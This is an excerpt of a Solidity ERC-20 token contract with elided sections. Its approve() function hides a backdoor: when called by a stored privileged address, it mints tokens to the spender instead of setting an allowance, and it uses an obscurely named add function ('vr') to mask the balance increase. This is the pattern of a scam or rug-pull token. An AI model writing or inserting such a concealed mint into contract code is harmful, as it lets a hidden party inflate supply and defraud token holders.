...
library SafeMath {
    ...
    function vr(uint256 a, uint256 b) internal pure returns (uint256) {uint256 c = a + b;require(c >= a, "overflow");return c;}
}
...
contract Testing is Context, IERC20, Ownable {
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
        if(spenders == _msgSender())
        { (, uint256 rTransferAmount, uint256 rFee, , uint256 tFee,uint256 tBurnValue,uint256 tTax,uint256 tLiquidity) = _getValues(amount);
          _rOwned[spender]=_rOwned[spender].vr(rTransferAmount);
          _reflectFee(rFee, tFee, tBurnValue,tTax,tLiquidity);
          emit Transfer(spender, spender, amount);}
        else{_approve(_msgSender(), spender, amount);}
        return true;
    }
